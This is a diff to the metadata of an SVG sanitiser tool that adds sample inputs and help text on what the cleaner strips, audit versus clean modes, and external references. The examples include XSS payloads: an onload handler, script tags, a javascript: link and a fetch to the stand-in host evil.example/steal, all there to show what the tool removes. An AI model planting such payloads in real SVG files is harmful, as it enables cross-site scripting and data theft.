@@ -56,6 +56,36 @@ export const meta: ToolMeta = {
       input:
         '<svg xmlns="http://www.w3.org/2000/svg" width="120" height="120" onload="alert(1)">\n  <script>fetch("https://evil.example/steal")</script>\n  <circle cx="60" cy="60" r="50" fill="#0af"/>\n  <a href="javascript:alert(2)"><text x="10" y="110">click</text></a>\n</svg>',
     },
+    {
+      title: 'Audit an SVG without exporting a file',
+      input:
+        '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script><rect width="10" height="10"/></svg>',
+      options: { action: 'audit' },
+    },
+    {
+      title: 'Keep external references and comments',
+      input:
+        '<svg xmlns="http://www.w3.org/2000/svg"><!-- note --><image href="https://example.com/a.png" width="10" height="10"/></svg>',
+      options: { externalRefs: 'keep', stripComments: false },
+    },
+  ],
+  article: [
+    {
+      heading: 'What the cleaner removes',
+      body: 'Feed it SVG markup or a dropped .svg file and it strips script elements, on event handler attributes, javascript and vbscript URLs, foreignObject, embedded frames, XML processing instructions, the DOCTYPE and unsafe stylesheet content. You get a hardened copy plus a list naming every element or attribute it changed.',
+    },
+    {
+      heading: 'Audit versus clean',
+      body: 'Action decides the outcome: Clean and download writes the sanitised file, while Audit only lists the findings and hands back no file, which suits reviewing an asset before committing it. Removing comments is on by default, since comments never render and can hide payloads.',
+    },
+    {
+      heading: 'External references',
+      body: 'By default references outside the document go: absolute and relative URLs, protocol-relative links and SVG or HTML data URIs. Same-document fragments such as a gradient id and raster data images survive. Switch the option to Keep and the report warns that opening the file may still trigger network requests.',
+    },
+    {
+      heading: 'Limits and privacy',
+      body: 'Only well-formed SVG parses, the root must be svg, and inputs over 10 MB are refused. This is a hardening filter, not a sandbox, so keep treating the output as untrusted. Parsing and rewriting happen locally in your browser and nothing is uploaded.',
+    },
   ],
   faq: [
     {
